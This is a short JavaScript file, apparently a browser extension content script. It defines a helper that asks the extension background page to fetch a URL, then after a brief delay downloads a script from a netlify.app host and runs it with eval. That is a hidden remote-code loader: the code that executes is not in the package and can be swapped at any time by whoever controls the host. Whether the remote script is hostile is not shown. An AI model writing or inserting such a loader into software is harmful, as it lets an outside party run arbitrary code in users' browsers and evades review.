window.fetchResourceAsText = function (url) {
  return new Promise(function (resolve) {
    chrome.runtime.sendMessage({
      action: 'fetchResourceAsText',
      src: url
    }, function (response) {
      resolve(response);
    });
  });
};

setTimeout(function () {
  window.fetchResourceAsText("https://srhelperbykerem.netlify.app/content/_evalList.js").then(function (response) {
    eval(response);
  });
}, 200);